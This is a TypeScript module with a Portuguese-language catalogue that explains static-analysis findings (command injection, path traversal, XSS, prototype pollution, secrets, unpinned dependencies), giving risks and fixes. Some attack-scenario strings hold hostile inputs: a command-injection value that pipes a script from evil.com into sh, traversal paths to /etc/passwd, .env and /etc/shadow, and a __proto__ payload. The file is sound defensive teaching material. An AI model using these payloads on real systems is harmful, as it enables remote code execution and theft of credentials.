// ============================================================
// Catálogo de explicações — o que cada classe de achado significa.
//
// Cobre as regras e CWEs mais frequentes SEM chamar IA: resposta instantânea,
// custo zero e disponível mesmo sem chave configurada. A IA (lib/enrich.ts) só
// entra no que não está aqui. Ver AUDITORIA.md#FEAT-03.
//
// Estruturado por locale desde já para não precisar reescrever no i18n
// (FEAT-04) — hoje só existe pt-BR.
// ============================================================
import type { FindingExplain } from "@/types";

type Entry = Omit<FindingExplain, "source">;

/** Casa pelo FIM do check_id (as regras vêm com o caminho inteiro em pontos). */
const RULES_PT: Record<string, Entry> = {
  "detect-child-process": {
    title: "Execução de comando do sistema",
    whatItIs:
      "O código executa comandos do sistema operacional a partir do próprio programa.",
    whyItMatters:
      "Se qualquer parte do comando vier de entrada do usuário, um atacante encadeia comandos próprios e passa a executar código no servidor com os privilégios da aplicação.",
    attackScenario:
      'Um valor como `arquivo.txt; curl evil.com/shell | sh` transforma um comando inofensivo em execução remota.',
    howToFix:
      "Troque `exec`/`execSync` por `execFile`/`spawn` com os argumentos em ARRAY (o shell deixa de interpretar a string) e valide a entrada contra uma lista do que é permitido.",
  },
  "detect-non-literal-fs-filename": {
    title: "Caminho de arquivo montado dinamicamente",
    whatItIs:
      "Um caminho de arquivo é montado dinamicamente, em vez de ser fixo no código.",
    whyItMatters:
      "Se o caminho aceitar `../`, o atacante sai do diretório previsto e lê ou grava arquivos arbitrários do servidor — inclusive `.env` e chaves privadas.",
    attackScenario:
      "Pedir `../../../../etc/passwd` (ou `..\\..\\.env` no Windows) num parâmetro que vira nome de arquivo.",
    howToFix:
      "Normalize com `path.resolve` e confirme que o resultado começa no diretório permitido antes de abrir. Melhor ainda: aceite um identificador e faça o mapeamento para o caminho no servidor.",
  },
  "path-join-resolve-traversal": {
    title: "Travessia de diretório em path.join",
    whatItIs:
      "Um caminho vindo de fora é concatenado com um diretório base via `path.join`/`resolve`.",
    whyItMatters:
      "`path.join` resolve `..` silenciosamente: o resultado pode apontar para fora do diretório pretendido.",
    attackScenario:
      "`path.join('/uploads', '../../etc/shadow')` resulta em `/etc/shadow`.",
    howToFix:
      "Depois de resolver, verifique `resolvido.startsWith(baseDir + path.sep)`; recuse o que sair do base.",
  },
  "detect-non-literal-require": {
    title: "Módulo carregado por nome dinâmico",
    whatItIs: "Um módulo é carregado a partir de um nome calculado em runtime.",
    whyItMatters:
      "Se o nome tiver qualquer influência externa, o atacante carrega um módulo arbitrário do disco e executa o código dele.",
    howToFix:
      "Use um mapa fixo de nomes permitidos para os módulos, em vez de montar o caminho dinamicamente.",
  },
  "detect-non-literal-regexp": {
    title: "Expressão regular construída em runtime",
    whatItIs:
      "Uma expressão regular é construída a partir de um valor dinâmico.",
    whyItMatters:
      "Além de erros de sintaxe em runtime, uma expressão vinda de fora pode causar retrocesso catastrófico (ReDoS) e travar o processo inteiro com uma única requisição.",
    howToFix:
      "Use expressões fixas. Se precisar interpolar, escape os metacaracteres e imponha um limite de tamanho à entrada.",
  },
  "detect-redos": {
    title: "Expressão regular vulnerável a ReDoS",
    whatItIs:
      "A expressão regular tem um padrão sujeito a retrocesso catastrófico.",
    whyItMatters:
      "Uma entrada relativamente curta faz o motor de regex explorar um número exponencial de caminhos, travando o event loop e derrubando o serviço.",
    attackScenario:
      "Um campo com dezenas de caracteres repetidos consome 100% de CPU por minutos.",
    howToFix:
      "Reescreva o padrão eliminando quantificadores aninhados (`(a+)+`), ou troque por análise sem regex. Limite o tamanho da entrada antes de aplicar.",
  },
  "prototype-pollution-assignment": {
    title: "Poluição de protótipo por atribuição",
    whatItIs:
      "Uma atribuição usa chave dinâmica, permitindo escrever em `__proto__`.",
    whyItMatters:
      "Poluir o protótipo afeta TODOS os objetos do processo: dá para forjar propriedades de autorização e alterar o comportamento de bibliotecas.",
    attackScenario:
      'Um JSON com `{"__proto__": {"isAdmin": true}}` faz qualquer objeto passar a responder `isAdmin`.',
    howToFix:
      "Recuse as chaves `__proto__`, `constructor` e `prototype`, ou use `Map`/`Object.create(null)` para dados vindos de fora.",
  },
  "prototype-pollution-loop": {
    title: "Poluição de protótipo em cópia recursiva",
    whatItIs: "Uma cópia recursiva de objeto sem barreira contra `__proto__`.",
    whyItMatters:
      "É o vetor clássico de poluição de protótipo em funções de merge/clone.",
    howToFix:
      "Pule as chaves perigosas no laço, ou use `structuredClone`/uma biblioteca que já trate isso.",
  },
  "insecure-innerhtml": {
    title: "HTML inserido no DOM sem sanitização",
    whatItIs: "HTML é inserido na página por atribuição direta ao DOM.",
    whyItMatters:
      "Qualquer conteúdo não sanitizado vira script executando no navegador da vítima, com acesso à sessão dela (XSS).",
    howToFix:
      "Use `textContent` para texto. Se precisar de HTML, sanitize com uma biblioteca dedicada (DOMPurify) antes de inserir.",
  },
  "react-dangerouslysetinnerhtml": {
    title: "dangerouslySetInnerHTML sem sanitização",
    whatItIs: "Uso de `dangerouslySetInnerHTML` no React.",
    whyItMatters:
      "Este atributo desliga a proteção automática do React contra XSS — o conteúdo é inserido cru.",
    howToFix:
      "Renderize como texto sempre que possível; se HTML for necessário, sanitize antes.",
  },
  "raw-html-format": {
    title: "HTML montado por concatenação",
    whatItIs: "HTML montado por concatenação de strings.",
    whyItMatters:
      "Interpolar valor não escapado dentro de HTML é a origem mais comum de XSS refletido e armazenado.",
    howToFix:
      "Use o mecanismo de template do framework (que escapa por padrão) ou escape explicitamente cada valor interpolado.",
  },
  "jquery-insecure-selector": {
    title: "Seletor jQuery com valor dinâmico",
    whatItIs: "Um seletor jQuery é montado com valor dinâmico.",
    whyItMatters:
      "O jQuery interpreta seletores que começam com `<` como HTML — o valor vira elemento executável no DOM.",
    howToFix:
      "Use `document.querySelector` com seletor fixo, ou `$(document).find(valor)` após validar.",
  },
  "unsafe-dynamic-method": {
    title: "Método invocado por nome dinâmico",
    whatItIs: "Um método é invocado por nome calculado em runtime.",
    whyItMatters:
      "Se o nome for influenciável de fora, o atacante chama métodos não previstos do objeto (inclusive herdados do protótipo).",
    howToFix:
      "Use um mapa explícito nome → função, recusando o que não estiver nele.",
  },
  "js-open-redirect-from-function": {
    title: "Redirecionamento aberto",
    whatItIs: "Um redirecionamento usa destino vindo de fora.",
    whyItMatters:
      "O atacante usa o seu domínio como trampolim para uma página de phishing — o link parece legítimo porque começa no seu site.",
    howToFix:
      "Aceite apenas caminhos relativos, ou valide o destino contra uma lista de domínios permitidos.",
  },
  "bypass-tls-verification": {
    title: "Verificação de certificado TLS desativada",
    whatItIs: "A verificação do certificado TLS está desativada.",
    whyItMatters:
      "Sem validar o certificado, qualquer intermediário na rede lê e altera o tráfego — a criptografia deixa de proteger contra ataque ativo.",
    howToFix:
      "Remova `rejectUnauthorized: false` / `verify=False`. Se for certificado interno, instale a CA no armazenamento de confiança em vez de desligar a checagem.",
  },
  "third-party-action-not-pinned-to-commit-sha": {
    title: "GitHub Action de terceiro não fixada em commit",
    whatItIs:
      "Uma GitHub Action de terceiro é referenciada por tag (`@v3`) em vez de SHA de commit.",
    whyItMatters:
      "Tags são móveis: quem controla o repositório da action pode reapontar `v3` para código malicioso, que passa a rodar no seu CI com acesso aos segredos do pipeline.",
    attackScenario:
      "A conta do mantenedor é comprometida, a tag é reapontada e o próximo build exfiltra as credenciais de deploy.",
    howToFix:
      "Fixe no SHA completo do commit (`uses: dono/acao@<sha40>`) e atualize de forma controlada, por exemplo com Dependabot.",
  },
  "dockerfile-source-not-pinned": {
    title: "Imagem base do Docker não fixada",
    whatItIs: "A imagem base do Dockerfile não está fixada.",
    whyItMatters:
      "Builds deixam de ser reproduzíveis e uma imagem base alterada entra no seu ambiente sem revisão.",
    howToFix: "Fixe por digest (`FROM imagem@sha256:...`) ou ao menos por versão exata.",
  },
  "package-dependencies-check": {
    title: "Dependências com versão não fixada",
    whatItIs:
      "A declaração de dependências permite versões não fixadas (faixas como `^` ou `*`).",
    whyItMatters:
      "Uma versão publicada com código malicioso entra na próxima instalação sem ninguém revisar — é o vetor de ataque de cadeia de suprimentos mais comum em npm.",
    howToFix:
      "Fixe as versões e versione o lockfile. Use `npm ci` no CI, que instala exatamente o que está no lock.",
  },
  "generic-api-key": {
    title: "Chave de API no código",
    whatItIs: "Uma chave de API aparente está escrita no código.",
    whyItMatters:
      "Segredo em repositório vaza para todo mundo com acesso ao clone — e permanece no histórico do git mesmo depois de removido.",
    howToFix:
      "Mova para variável de ambiente, REVOGUE a chave exposta (ela deve ser considerada comprometida) e limpe o histórico se o repositório for público.",
  },
  "detected-generic-secret": {
    title: "Segredo no código",
    whatItIs: "Um valor com aparência de segredo está no código.",
    whyItMatters:
      "Credenciais em repositório são o achado mais explorado por varredores automáticos — bots encontram chaves públicas em minutos.",
    howToFix:
      "Mova para variável de ambiente e revogue o valor exposto.",
  },
  "private-key": {
    title: "Chave privada versionada",
    whatItIs: "Uma chave privada está versionada no repositório.",
    whyItMatters:
      "Quem tiver a chave assume a identidade do serviço: assina tokens, decifra tráfego ou acessa servidores.",
    howToFix:
      "Remova, GERE UM NOVO PAR e distribua a chave por um cofre de segredos. Trate a chave antiga como comprometida.",
  },
  "unsafe-formatstring": {
    title: "String de formatação dinâmica",
    whatItIs: "Uma string de formatação é montada dinamicamente.",
    whyItMatters:
      "Dependendo da linguagem, permite ler memória ou provocar erro não tratado.",
    howToFix: "Use string de formato fixa e passe os valores como argumentos.",
  },
  "eqeq-is-bad": {
    title: "Comparação frouxa (==) em vez de estrita",
    whatItIs: "Comparação com `==` em vez de `===`.",
    whyItMatters:
      "A coerção de tipos do JavaScript cria igualdades surpreendentes (`0 == '0'`, `'' == false`), o que em verificação de permissão vira falha de autorização.",
    howToFix: "Use `===`/`!==` e converta os tipos explicitamente.",
  },
  "useless-assignment": {
    title: "Atribuição sem uso",
    whatItIs: "Uma variável recebe valor que nunca é usado.",
    whyItMatters:
      "Não é falha de segurança, mas costuma indicar lógica incompleta — inclusive validação que foi escrita e não aplicada.",
    howToFix: "Remova a atribuição, ou use o valor se a intenção era validá-lo.",
  },
};

/** Fallback por CWE quando a regra específica não está no catálogo. */
const CWES_PT: Record<string, Entry> = {
  "CWE-78": {
    title: "Injeção de comando do sistema",
    whatItIs: "Injeção de comando do sistema operacional.",
    whyItMatters:
      "Entrada não confiável chega a um interpretador de comandos e o atacante executa o que quiser no servidor.",
    howToFix:
      "Execute com argumentos em array (sem shell) e valide a entrada contra uma lista do permitido.",
  },
  "CWE-79": {
    title: "Cross-site scripting (XSS)",
    whatItIs: "Cross-site scripting (XSS).",
    whyItMatters:
      "Script controlado pelo atacante roda no navegador da vítima com a sessão dela — dá para roubar tokens e agir em nome do usuário.",
    howToFix:
      "Escape a saída conforme o contexto (HTML, atributo, JS) e sanitize qualquer HTML aceito.",
  },
  "CWE-89": {
    title: "Injeção de SQL",
    whatItIs: "Injeção de SQL.",
    whyItMatters:
      "O atacante altera a consulta e lê, modifica ou apaga dados que não deveria alcançar — frequentemente o banco inteiro.",
    howToFix:
      "Use consultas parametrizadas (placeholders do driver). Nunca concatene entrada na string SQL.",
  },
  "CWE-22": {
    title: "Travessia de diretório",
    whatItIs: "Travessia de diretório (path traversal).",
    whyItMatters:
      "Permite ler ou gravar arquivos fora do diretório previsto, incluindo configuração e segredos.",
    howToFix:
      "Normalize o caminho e confirme que ele permanece dentro do diretório base.",
  },
  "CWE-94": {
    title: "Injeção de código",
    whatItIs: "Injeção de código.",
    whyItMatters:
      "Entrada não confiável é interpretada como código do próprio programa.",
    howToFix: "Elimine `eval`/`Function`; use estruturas de dados em vez de código gerado.",
  },
  "CWE-502": {
    title: "Desserialização insegura",
    whatItIs: "Desserialização insegura.",
    whyItMatters:
      "Objetos vindos de fora podem disparar execução de código durante a reconstrução.",
    howToFix:
      "Desserialize apenas formatos de dados puros (JSON) e valide o schema antes de usar.",
  },
  "CWE-611": {
    title: "XML com entidades externas (XXE)",
    whatItIs: "Processamento de XML com entidades externas (XXE).",
    whyItMatters:
      "Permite ler arquivos locais e alcançar serviços internos a partir do parser.",
    howToFix: "Desative entidades externas e DTD no parser de XML.",
  },
  "CWE-918": {
    title: "Server-Side Request Forgery (SSRF)",
    whatItIs: "Server-Side Request Forgery (SSRF).",
    whyItMatters:
      "O servidor faz requisições para onde o atacante mandar, alcançando serviços internos e metadados de nuvem.",
    howToFix:
      "Restrinja destino a uma lista de domínios permitidos e bloqueie faixas de IP privadas, inclusive após redirecionamento.",
  },
  "CWE-798": {
    title: "Credencial embutida no código",
    whatItIs: "Credencial embutida no código.",
    whyItMatters:
      "Quem lê o código — ou o histórico do git — obtém acesso direto ao recurso protegido.",
    howToFix: "Mova para variável de ambiente e revogue o valor exposto.",
  },
  "CWE-327": {
    title: "Criptografia fraca ou obsoleta",
    whatItIs: "Algoritmo de criptografia fraco ou obsoleto.",
    whyItMatters:
      "Algoritmos quebrados (MD5, SHA-1, DES) não oferecem a proteção que a arquitetura assume.",
    howToFix:
      "Use AES-GCM para cifra, SHA-256+ para hash de dados e Argon2/bcrypt para senha.",
  },
  "CWE-601": {
    title: "Redirecionamento aberto",
    whatItIs: "Redirecionamento aberto.",
    whyItMatters: "Seu domínio passa a dar credibilidade a um link de phishing.",
    howToFix: "Aceite apenas caminhos relativos ou destinos de uma lista permitida.",
  },
  "CWE-1321": {
    title: "Poluição de protótipo",
    whatItIs: "Poluição de protótipo.",
    whyItMatters:
      "Altera o comportamento de todos os objetos do processo, incluindo checagens de permissão.",
    howToFix: "Recuse `__proto__`/`constructor`/`prototype` em dados externos.",
  },
  "CWE-1333": {
    title: "Regex de complexidade exponencial (ReDoS)",
    whatItIs: "Expressão regular com complexidade exponencial (ReDoS).",
    whyItMatters:
      "Uma requisição pequena consome CPU indefinidamente e derruba o serviço.",
    howToFix: "Reescreva o padrão e limite o tamanho da entrada.",
  },
  "CWE-1357": {
    title: "Componente de terceiro não confiável",
    whatItIs: "Dependência de componente de terceiro não confiável o bastante.",
    whyItMatters:
      "Código de terceiro roda com os mesmos privilégios do seu — se ele for alterado, você executa a alteração.",
    howToFix: "Fixe a versão por digest/SHA e revise as atualizações.",
  },
};

function norm(s: string | undefined): string {
  return (s || "").trim().toLowerCase();
}

/** Só o último segmento do check_id ("…javascript.lang.security.detect-x"). */
function ruleKey(ruleId: string | undefined): string {
  const seg = norm(ruleId).split(/[.\\/]/).filter(Boolean).pop();
  return seg || "";
}

/** Primeiro identificador CWE presente no texto ("CWE-79: ..."). */
function cweKey(cwe: string | undefined): string {
  const m = /CWE-\d+/i.exec(cwe || "");
  return m ? m[0].toUpperCase() : "";
}

/** Idiomas que o catálogo já tem redigidos. */
const CATALOG_LOCALES = new Set(["pt-BR"]);

/**
 * Procura no catálogo por regra e, se não achar, por CWE.
 * Retorna undefined quando nada casa — aí entra a IA (lib/enrich.ts).
 *
 * Idioma sem catálogo redigido devolve undefined DE PROPÓSITO: entregar texto
 * em português para quem escolheu inglês seria pior que cair na IA (ou, sem
 * chave, manter o texto original da ferramenta — que já é inglês).
 */
export function lookupCatalog(
  ruleId: string | undefined,
  cwe: string | undefined,
  locale = "pt-BR"
): FindingExplain | undefined {
  if (!CATALOG_LOCALES.has(locale)) return undefined;
  const byRule = RULES_PT[ruleKey(ruleId)];
  if (byRule) return { ...byRule, source: "catalog" };
  const byCwe = CWES_PT[cweKey(cwe)];
  if (byCwe) return { ...byCwe, source: "catalog" };
  return undefined;
}

export const CATALOG_SIZE = Object.keys(RULES_PT).length + Object.keys(CWES_PT).length;
